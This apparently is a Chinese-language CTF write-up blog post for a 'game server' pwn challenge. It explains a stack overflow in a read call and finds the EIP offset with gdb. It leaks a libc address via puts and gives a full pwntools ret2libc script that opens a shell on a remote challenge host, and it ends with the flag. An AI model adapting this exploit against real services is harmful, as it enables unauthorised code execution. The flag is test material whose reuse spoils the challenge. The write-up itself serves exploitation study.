---
layout: post
title: "game server"
date: 2018-05-01
categories: jekyll update
---
### game server
##### 操作内容：
首先IDA分析程序，发现有三个输入的地方，但是前面两个都是最多输入256字节大小的字符，并且内容都是用一个指针来指向的，所以并没有出现有溢出点，但是最后输入`introduction`的时候是用`read`输入前面`snprintf`成功读取的字节数，这读取字节数的可控性，而且s又是放在栈上的，这就造成了溢出，如下图：

<img src="/images/posts/redhat/1525178282949.png" >

gdb调试找偏移地址的整个过程：

以发现返回地址：

<img src="/images/posts/redhat/1525184025856.png" >

这时断在`read`函数，`ni`单步执行输入`introduction`的内容，发现可以输入的字节数完全可以覆盖返回地址，远不止255个字符：

`gdb`调试用`pattern`计算得到`eip`的距离为277

在`read`后面`0x08048794`下断点，然后`gdb`调试：
看到地址已经被成功覆盖为`puts_plt`表的地址，如图：

<img src="/images/posts/redhat/1525178294717.png" >

<img src="/images/posts/redhat/1525178301877.png" >

```
payload = "C"*277 + p32(puts_plt) + p32(main) + p32(libc_start_main_got)
p.sendline(payload)
```

然后在接收相应的地址的时候出了问题，发现直接payload后面设置标志来接收后面部分都是出现一大堆乱七八糟的东西，最后找到原因是最后return是一个printf函数，用于打印整个用户信息：

<img src="/images/posts/redhat/1525183460082.png" >

要准确在其后面接收信息，发现后面有个换行符，再加上我用的sendline来send的payload，所以直接`p.recvuntil("\n\n")`就可以成功接收到payload了

<img src="/images/posts/redhat/1525185853350.png" >

计算pattern：

pattern create 300：

<img src="/images/posts/redhat/1525185943806.png" >

continue输入pattern，发现他断下来报错，那是因为ret是一个不存在的地址而导致的：

<img src="/images/posts/redhat/1525186115609.png" >

<img src="/images/posts/redhat/1525186168612.png" >


得到EIP偏移为277

然后接收到libc地址后(泄露libc地址)，再通过网站https://libc.blukat.me/或者用libc-database来找对应版本的libc库，最后注意ret地址要是主界面的那个子程序(0x08048637)，这样可以保持栈平衡，最后再一次ret2libc来执行system来getshell就ok了

脚本如下：
```
from pwn import *
from LibcSearcher import *
elf = ELF('./pwn2')
#p = process('./pwn2')
p = remote('123.59.138.180',20000)
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
libc_start_main_got = elf.got['__libc_start_main']
print hex(libc_start_main_got)
print hex(puts_got)
print p.recvuntil("First, you need to tell me you name?")
p.sendline("A"*255)
#print p.recvuntil("What's you occupation?")
#p.sendline("B"*255)
print p.recvuntil("[Y/N]")
p.sendline('Y')
main = 0x08048637
#payload = "C"*277 + p32(puts_plt) + p32(main) + p32(puts_got)
payload = "C"*277 + p32(puts_plt) + p32(main) + p32(libc_start_main_got)
pause()
p.sendline(payload)
p.recvuntil("\n\n")
libc_start_main_addr  = u32(p.recv(4))
print hex(libc_start_main_addr)
pause()
libc_base = libc_start_main_addr - 0x018540
system_addr = libc_base + 0x03a940
binsh_addr = libc_base + 0x15902b
log.info("libc_base addr " + hex(libc_base))
log.info("system_addr addr " + hex(system_addr))
log.info("binsh_addr addr " + hex(binsh_addr))


print p.recvuntil("First, you need to tell me you name?")
p.sendline("A"*255)
print p.recvuntil("[Y/N]")
p.sendline('Y')
payload_getshell = "C"*277 + p32(system_addr) + p32(0) + p32(binsh_addr)
p.sendline(payload_getshell)
p.interactive()

#EIP+0 found at offset: 277
#EBP+0 found at offset: 273
```
#### FLAG值：
`flag{f3b92d795c9ee0725c160680acd084d9}`